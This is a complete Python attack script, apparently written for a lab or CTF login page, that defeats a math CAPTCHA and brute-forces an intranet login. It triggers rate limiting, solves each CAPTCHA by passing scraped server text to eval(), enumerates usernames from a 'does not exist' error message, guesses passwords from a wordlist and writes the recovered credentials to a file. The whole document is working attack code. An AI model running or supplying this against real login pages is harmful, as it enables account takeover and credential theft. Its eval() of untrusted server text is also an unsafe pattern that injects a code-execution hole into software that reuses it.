#!/usr/bin/env python3

import sys
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Uncomment if using Burp Suite proxy
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = {}  # No proxy for direct connection

s = requests.session()
reg_pattern = r'\d{1,}\s*[+\-*/]\s*\d{1,}'

def get_captcha(url):
    """
    Trigger the captcha by making a request without captcha field
    and extract the math problem to solve it
    """
    data = {'username': 'test', 'password': 'testpass'}
    
    try:
        res = s.post(url=url, data=data, verify=False, proxies=proxies, timeout=10)
        
        challenge = re.search(reg_pattern, res.text)
        if challenge:
            solution = eval(challenge.group().strip())
            print(f"[*] Captcha: {challenge.group().strip()} = {solution}")
            return solution
        else:
            print("[!] No captcha found in response")
            return None
    except Exception as e:
        print(f"[!] Error getting captcha: {e}")
        return None

def user_enum(url, user_list, captcha):
    """
    Enumerate valid usernames
    """
    print("\n[+] Enumerating users...")
    print("-" * 50)
    
    with open(user_list, 'r') as file:
        users = file.readlines()
        
    for i, username in enumerate(users, 1):
        username = username.strip()
        if not username:
            continue
            
        print(f"[{i}/{len(users)}] Testing: {username:<25}", end="")
        
        try:
            data = {
                'username': username,
                'password': 'testpass',
                'captcha': captcha
            }
            
            res = s.post(url=url, data=data, verify=False, proxies=proxies, timeout=10)
            
            # Check response
            if "does not exist" in res.text:
                print("[✗] Invalid user")
                
            elif "Invalid captcha" in res.text:
                print("[!] Captcha expired, refreshing...")
                captcha = get_captcha(url)
                if not captcha:
                    continue
                # Retry with new captcha
                data['captcha'] = captcha
                res = s.post(url=url, data=data, verify=False, proxies=proxies, timeout=10)
                
                if "does not exist" in res.text:
                    print("[✗] Invalid user")
                elif "Invalid captcha" in res.text:
                    print("[✗] Captcha failed again, skipping...")
                    continue
                else:
                    print(f"\n[✓] USERNAME FOUND: {username}")
                    return username, captcha
            else:
                # No error for "does not exist" = username exists!
                print(f"\n[✓] USERNAME FOUND: {username}")
                return username, captcha
            
            # Get new captcha from response for next attempt
            challenge = re.search(reg_pattern, res.text)
            if challenge:
                captcha = eval(challenge.group().strip())
                
        except Exception as e:
            print(f"[!] Error: {e}")
            continue
    
    print("\n[-] No valid username found!")
    return None, captcha

def pass_enum(url, username, pass_list, captcha):
    """
    Brute-force password for found username
    """
    print(f"\n[+] Enumerating password for user: {username}")
    print("-" * 50)
    
    with open(pass_list, 'r') as file:
        passwords = file.readlines()
    
    for i, password in enumerate(passwords, 1):
        password = password.strip()
        if not password:
            continue
        
        # Progress indicator
        if i % 10 == 0:
            print(f"\r[*] Progress: {i}/{len(passwords)} passwords tested...", end="")
        
        try:
            data = {
                'username': username,
                'password': password,
                'captcha': captcha
            }
            
            res = requests.post(url=url, data=data, verify=False, proxies=proxies, timeout=10)
            
            # Check for different responses
            if "does not exist" in res.text:
                print(f"\n[!] Username '{username}' suddenly doesn't exist. Stopping.")
                return None
                
            elif "Invalid captcha" in res.text:
                print(f"\r[*] Captcha expired at password {i}, refreshing...", end="")
                # Get new captcha
                challenge = re.search(reg_pattern, res.text)
                if challenge:
                    captcha = eval(challenge.group().strip())
                    # Retry same password with new captcha
                    data['captcha'] = captcha
                    res = requests.post(url=url, data=data, verify=False, proxies=proxies, timeout=10)
                    
                    if "does not exist" in res.text or "Invalid captcha" in res.text:
                        continue
                    elif "Error" in res.text:
                        continue
                    else:
                        print(f"\n[✓] PASSWORD FOUND: {password}")
                        return password
            
            # Check if login was successful
            # Look for absence of error messages and login form
            if "Error" not in res.text and "Invalid" not in res.text:
                if "login" not in res.url.lower():
                    print(f"\n[✓] PASSWORD FOUND: {password}")
                    return password
            
            # If we see "Error" but not "does not exist", it's wrong password
            # Continue to next password
            
            # Get new captcha for next attempt
            challenge = re.search(reg_pattern, res.text)
            if challenge:
                captcha = eval(challenge.group().strip())
                
        except Exception as e:
            print(f"\n[!] Error: {e}")
            continue
    
    print(f"\n[-] Password not found for {username}")
    return None

def main():
    if len(sys.argv) != 4:
        print(f"[+] Usage: {sys.argv[0]} URL path_to_user_wordlist path_to_pass_wordlist")
        print(f"[+] Example: {sys.argv[0]} http://10.49.136.61/login usernames.txt passwords.txt")
        sys.exit(-1)
    
    url = sys.argv[1].strip()
    user_list = sys.argv[2].strip()
    pass_list = sys.argv[3].strip()
    
    print("=" * 60)
    print("  Intranet Login Brute-Forcer with CAPTCHA Solver")
    print("=" * 60)
    print(f"[*] Target: {url}")
    print(f"[*] Username wordlist: {user_list}")
    print(f"[*] Password wordlist: {pass_list}")
    
    # Phase 0: Trigger rate limiting to enable CAPTCHA
    print("\n[*] Triggering rate limit to activate CAPTCHA...")
    for i in range(10):
        params = {'username': 'test', 'password': 'test'}
        try:
            res = s.post(url=url, data=params, verify=False, proxies=proxies, timeout=5)
            if "Invalid captcha" in res.text or "Captcha enabled" in res.text:
                print("[*] CAPTCHA activated!")
                break
        except:
            pass
    
    # Get initial captcha
    print("\n[*] Getting initial captcha...")
    captcha = get_captcha(url)
    if not captcha:
        print("[!] Failed to get captcha. Exiting.")
        sys.exit(-1)
    
    # Phase 1: Username enumeration
    username, captcha = user_enum(url, user_list, captcha)
    if not username:
        print("\n[!] Could not find valid username. Exiting.")
        sys.exit(-1)
    
    # Phase 2: Password enumeration
    password = pass_enum(url, username, pass_list, captcha)
    
    # Final result
    print("\n" + "=" * 60)
    if password:
        print(f"[✓] CREDENTIALS FOUND: {username}:{password}")
        # Save to file
        with open('credentials.txt', 'w') as f:
            f.write(f"Username: {username}\nPassword: {password}\n")
        print("[*] Saved to 'credentials.txt'")
    else:
        print(f"[✗] Could not find password for user '{username}'")
    print("=" * 60)

if __name__ == "__main__":
    main()